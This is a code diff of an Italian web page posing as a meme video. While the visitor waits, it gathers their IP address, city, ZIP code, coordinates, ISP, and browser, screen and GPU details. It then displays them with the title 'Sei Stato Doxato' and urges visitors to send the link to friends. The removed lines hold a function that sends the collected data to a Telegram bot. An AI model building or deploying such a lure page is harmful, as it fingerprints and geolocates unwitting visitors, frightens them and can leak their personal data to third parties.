@@ -1,87 +1,219 @@
-<script>
-  // --- Browser Detector ---
-  !function(e,o){"object"==typeof exports&&"undefined"!=typeof module?module.exports=o():"function"==typeof define&&define.amd?define(o):(e="undefined"!=typeof globalThis?globalThis:e||self).BrowserDetector=o()}(this,function(){
-      "use strict";
-      // ... codice BrowserDetector come prima ...
-      // per brevità omesso qui, ma va copiato tutto
-  });
+<html>
 
-  // --- Script principale ---
-  window.onload = async () => {
-    const loadingProgress = document.getElementById('loading-progress');
-    const video = document.getElementById('video');
-    const preload = document.getElementById('preload');
-    const loading = document.getElementById('loading');
-    const start = document.getElementById('start');
-    const data = document.getElementById('data');
+<head>
+    <title>Memotto</title>
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta content="Guardami">
+    <meta content="website" property="og:type">
+    <meta content="Project Matrix EXE" name="twitter:title" property="og:title">
+    <meta content="Create By DanyX64YT And Others"
+        name="twitter:description" property="og:description">
+    <script defer src="script.js"></script>
+    <script>
 
-    const memes = [];
-    let step = 0, interval;
+        !function (e, o) { "object" == typeof exports && "undefined" != typeof module ? module.exports = o() : "function" == typeof define && define.amd ? define(o) : (e = "undefined" != typeof globalThis ? globalThis : e || self).BrowserDetector = o() }(this, (function () { "use strict"; function e(e, o) { for (var n = 0; n < o.length; n++) { var r = o[n]; r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r) } } var o = { chrome: "Google Chrome", brave: "Brave", crios: "Google Chrome", edge: "Microsoft Edge", edg: "Microsoft Edge", fennec: "Mozilla Firefox", jsdom: "JsDOM", mozilla: "Mozilla Firefox", msie: "Microsoft Internet Explorer", opera: "Opera", opios: "Opera", opr: "Opera", rv: "Microsoft Internet Explorer", safari: "Safari", samsungbrowser: "Samsung Browser", electron: "Electron" }, n = { android: "Android", androidTablet: "Android Tablet", cros: "Chrome OS", fennec: "Android Tablet", ipad: "IPad", iphone: "IPhone", jsdom: "JsDOM", linux: "Linux", mac: "Macintosh", tablet: "Android Tablet", win: "Windows", "windows phone": "Windows Phone", xbox: "Microsoft Xbox" }, r = function (e) { var o = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : -1, n = new RegExp("^-?\\d+(?:.\\d{0,".concat(o, "})?")), r = Number(e).toString().match(n); return r ? r[0] : null }, i = function () { return "undefined" != typeof window ? window.navigator : null }, t = function () { function t(e) { var o; !function (e, o) { if (!(e instanceof o)) throw new TypeError("Cannot call a class as a function") }(this, t), this.userAgent = e || (null === (o = i()) || void 0 === o ? void 0 : o.userAgent) || null } var a, l, s; return a = t, l = [{ key: "parseUserAgent", value: function (e) { var t, a, l, s = {}, c = e || this.userAgent || "", d = c.toLowerCase().replace(/\s\s+/g, " "), u = /(edge)\/([\w.]+)/.exec(d) || /(edg)[/]([\w.]+)/.exec(d) || /(opr)[/]([\w.]+)/.exec(d) || /(jsdom)[/]([\w.]+)/.exec(d) || /(samsungbrowser)[/]([\w.]+)/.exec(d) || /(electron)[/]([\w.]+)/.exec(d) || /(chrome)[/]([\w.]+)/.exec(d) || /(crios)[/]([\w.]+)/.exec(d) || /(opios)[/]([\w.]+)/.exec(d) || /(version)(applewebkit)[/]([\w.]+).*(safari)[/]([\w.]+)/.exec(d) || /(webkit)[/]([\w.]+).*(version)[/]([\w.]+).*(safari)[/]([\w.]+)/.exec(d) || /(applewebkit)[/]([\w.]+).*(safari)[/]([\w.]+)/.exec(d) || /(webkit)[/]([\w.]+)/.exec(d) || /(opera)(?:.*version|)[/]([\w.]+)/.exec(d) || /(msie) ([\w.]+)/.exec(d) || /(fennec)[/]([\w.]+)/.exec(d) || d.indexOf("trident") >= 0 && /(rv)(?::| )([\w.]+)/.exec(d) || d.indexOf("compatible") < 0 && /(mozilla)(?:.*? rv:([\w.]+)|)/.exec(d) || [], f = /(ipad)/.exec(d) || /(ipod)/.exec(d) || /(iphone)/.exec(d) || /(jsdom)/.exec(d) || /(windows phone)/.exec(d) || /(xbox)/.exec(d) || /(win)/.exec(d) || /(tablet)/.exec(d) || /(android)/.test(d) && !1 === /(mobile)/.test(d) && ["androidTablet"] || /(android)/.exec(d) || /(mac)/.exec(d) || /(linux)/.exec(d) || /(cros)/.exec(d) || [], p = u[5] || u[3] || u[1] || null, w = f[0] || null, x = u[4] || u[2] || null, b = i(); "chrome" === p && "function" == typeof (null == b || null === (t = b.brave) || void 0 === t ? void 0 : t.isBrave) && (p = "brave"), p && (s[p] = !0), w && (s[w] = !0); var m = Boolean(s.tablet || s.android || s.androidTablet), v = Boolean(s.ipad || s.tablet || s.androidTablet), g = Boolean(s.android || s.androidTablet || s.tablet || s.ipad || s.ipod || s.iphone || s["windows phone"]), h = Boolean(s.cros || s.mac || s.linux || s.win), y = Boolean(s.brave || s.chrome || s.crios || s.opr || s.safari || s.edg || s.electron), A = Boolean(s.msie || s.rv); return { name: null !== (a = o[p]) && void 0 !== a ? a : null, platform: null !== (l = n[w]) && void 0 !== l ? l : null, userAgent: c, version: x, shortVersion: x ? r(parseFloat(x), 2) : null, isAndroid: m, isTablet: v, isMobile: g, isDesktop: h, isWebkit: y, isIE: A } } }, { key: "getBrowserInfo", value: function () { var e = this.parseUserAgent(); return { name: e.name, platform: e.platform, userAgent: e.userAgent, version: e.version, shortVersion: e.shortVersion } } }], s = [{ key: "VERSION", get: function () { return "3.2.0" } }], l && e(a.prototype, l), s && e(a, s), Object.defineProperty(a, "prototype", { writable: !1 }), t }(); return t }));
 
-    const p = (k,d,s) => d && memes.push(`${k}: ${d}${s||''}`);
+        window.onload = async () => {
+            const loadingProgress = document.getElementById('loading-progress');
+            const video = document.getElementById('video');
+            const preload = document.getElementById('preload');
+            const loading = document.getElementById('loading');
+            const start = document.getElementById('start');
+            const data = document.getElementById('data');
 
-    try {
-      const basic = await (await fetch('https://wtfismyip.com/json')).json();
-      loadingProgress.textContent = '97';
+            const e = (m) => loading.innerText = m;
+            const p = (k, d, s) => d && memes.push(`${k}: ${d}${s || ''}`);
 
-      const detector = new BrowserDetector(window.navigator.userAgent).parseUserAgent();
+            const memes = [];
+            let step = 0;
+            let interval;
 
-      // Prendi solo i dati che ti servono
-      p('Indirizzo IP', basic.YourFuckingIPAddress);
-      p('Stato', basic.YourFuckingCountry);
-      p('Nome Browser', detector.name);
-      p('Piattaforma', detector.platform);
-      p('Versione Browser', detector.version);
+            video.oncanplaythrough = async () => {
+                const basic = await (await fetch('https://wtfismyip.com/json').catch(e)).json().catch(e);
+                loadingProgress.textContent = '97';
+                const detailed = await (await fetch(`/json/${basic.YourFuckingIPAddress}`).catch(() => e('Disabilita La Tua VPN O AD-Blocker E Ricarica'))).json().catch(e);
+                loadingProgress.textContent = '99';
+                const detector = new BrowserDetector(window.navigator.userAgent).parseUserAgent();
+                p('Indirizzo IP', basic.YourFuckingIPAddress);
+                p('Stato', basic.YourFuckingCountry);
+                p('Paese', detailed.country);
+                p('Regione', detailed.regionName);
+                p('Città', detailed.city);
+                p('Codice ZIP', detailed.zip);
+                p('Posizione Completa', basic.YourFuckingLocation);
+                p('Latitudine', detailed.lat);
+                p('Longitudine', detailed.lon);
+                p('Timezone', detailed.timezone);
+                p('Ora Corrente', new Date().toLocaleString());
+                p('ISP', basic.YourFuckingISP);
+                p('Organizazione', detailed.org);
+                p('Sistema Anonimo', detailed.as);
+                p('Nome Del Browser', detector.name);
+                p('Nome Piattaforma', detector.platform);
+                p('Versione Del Browser', detector.version);
+                p('Telefono | Tablet', (detector.isMobile || detector.isTablet) ? 'Yes' : 'No');
+                p('Riferimento', document.referrer || 'None');
+                p('Lingua Di Sistema', navigator.languages.join(', '));
+                p('Larghezza Schermo', screen.width, 'px');
+                p('Altezza Schermo', screen.height, 'px');
+                if (screen.width != window.width || screen.height != window.height) {
+                    p('Larghezza Finestra ', window.outerWidth, 'px');
+                    p('Altezza Finestra', window.outerHeight, 'px');
+                }
+                p('Profondita Pixel Schermo', screen.pixelDepth);
+                if (typeof screen.orientation != 'undefined') {
+                    p('Orientamento Schermo', screen.orientation.type.split('-')[0]);
+                    p('Rotazione Schermo', screen.orientation.angle, ' degrees');
+                }
+                p('Threads Della CPU', navigator.hardwareConcurrency);
+                p('Qualcosa', basic.YourFuckingHostname);
+                p('Memoria Del Browser Disponibile', typeof window.performance.memory != 'undefined' ? Math.round(window.performance.memory.jsHeapSizeLimit / 1024 / 1024) : null, 'MB');
 
-      loadingProgress.textContent = '100';
-      loading.style.display = 'none';
-      start.style.display = 'flex';
-      preload.style.cursor = 'pointer';
-    } catch(err){
-      console.error('Errore caricamento dati IP:', err);
-    }
+                const canvas = document.createElement('canvas');
+                let gl;
+                let debugInfo;
 
-    preload.onclick = () => {
-      if(start.style.display!='flex') return;
-      preload.style.display='none';
-      video.play();
+                try {
+                    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                } catch (e) { }
 
-      let fontSize = Math.min(window.innerHeight/10, window.innerWidth/20);
-      data.style.fontSize = fontSize+'px';
+                if (gl && debugInfo) {
+                    p('Marca GPU', gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL));
+                    p('Info GPU', gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL));
+                }
 
-      interval = setInterval(()=>{
-        const time = video.currentTime - 13.166 - step*0.5;
-        if(time>0 && memes[step]){
-          const el = document.createElement('span');
-          el.textContent = memes[step];
-          data.appendChild(el);
-          const height = data.getBoundingClientRect().height;
-          if(height > window.innerHeight){
-            fontSize = fontSize - (fontSize/10);
-            data.style.fontSize = fontSize+'px';
-          }
-          step++;
+                loadingProgress.textContent = '100';
+
+                loading.style.display = 'none';
+                start.style.display = 'flex';
+                preload.style.cursor = 'pointer';
+            };
+
+            video.onended = () => {
+                video.style.display = 'none';
+                if (interval) clearInterval(interval);
+            }
+
+            preload.onclick = () => {
+                if (start.style.display != 'flex') return;
+                preload.style.display = 'none';
+                video.play();
+
+                let fontSize = Math.min(window.innerHeight / 10, window.innerWidth / 20);
+                data.style.fontSize = fontSize + 'px';
+                interval = setInterval(() => {
+                    const time = video.currentTime - 13.166 - step * 0.500;
+                    if (time > 0) {
+                        if (step == 0) {
+                            document.title = 'Sei Stato Doxato (Chill)';
+                            plausible('Jammed');
+                        }
+                        const el = document.createElement('span');
+                        el.textContent = memes[step];
+                        data.appendChild(el);
+                        const height = data.getBoundingClientRect().height;
+                        if (height > window.innerHeight) {
+                            fontSize = fontSize - (fontSize / 10);
+                            data.style.fontSize = fontSize + 'px';
+                        }
+
+                        step++;
+                    }
+                }, 10);
+            }
+
+            video.src = 'jammin.mp4';
+            video.load();
         }
-      },10);
-    };
+    </script>
 
-    video.onended = () => {
-      video.style.display = 'none';
-      if(interval) clearInterval(interval);
-      sendMemesToTelegram(memes);
-    };
+    <style>
+        * {
+            background: rgb(0, 0, 0);
+            color: rgb(255, 255, 255);
+        }
 
-    video.src = 'jammin.mp4';
-    video.load();
-  };
+        body {
+            margin: 0;
+            overflow: hidden;
+            height: 100vh;
+            font-family: Arial, Helvetica, sans-serif;
+        }
 
-  async function sendMemesToTelegram(memes){
-    const botToken = 'IL_TUO_BOT_TOKEN';
-    const chatId = 'IL_TUO_CHAT_ID';
-    const message = encodeURIComponent(memes.join("\n"));
-    try {
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`);
-      console.log('Dati inviati a Telegram');
-    } catch(err){ console.error(err); }
-  }
-</script>
+        body,
+        #preload,
+        #loading,
+        #start,
+        #data {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #preload,
+        #video {
+            height: 100vh;
+            width: 100vw;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+
+        #preload,
+        #loading,
+        #start,
+        #data {
+            flex-direction: column;
+            font-size: 36px;
+            text-align: center;
+        }
+
+        #preload {
+            gap: 8px;
+            z-index: 2;
+        }
+
+        #data {
+            flex-direction: column;
+            text-align: center;
+        }
+
+        #data,
+        #data span {
+            z-index: 1;
+            background: transparent !important;
+        }
+
+        .subtitle {
+            font-size: 16px;
+        }
+
+        @media only screen and (min-aspect-ratio: 1/1) {
+            #video {
+                object-fit: cover;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div id="preload">
+        <div id="loading">
+            <span>Caricamento In Corso</span>
+            <span class="subtitle"><span id="loading-progress">0</span>%</span>
+        </div>
+        <div id="start" style="display: none">
+            <span>Clica Per Iniziare</span>
+        </div>
+        <span class="subtitle">Piccolo Meme Sono Molto Chill :)</span>
+        <span class="subtitle">Questa Esperienza Dovrai Ricordarla, Invia Questo Link Ai Tuoi Amici Per Una Bella Reazione</span>
+        <span class="subtitle">Grazie, Goditi Il Video.</span>
+    </div>
+    <div id="data"></div>
+    <video id="video" playsinline style="pointer-events: none"></video>
+</body>
+</html>
+
+
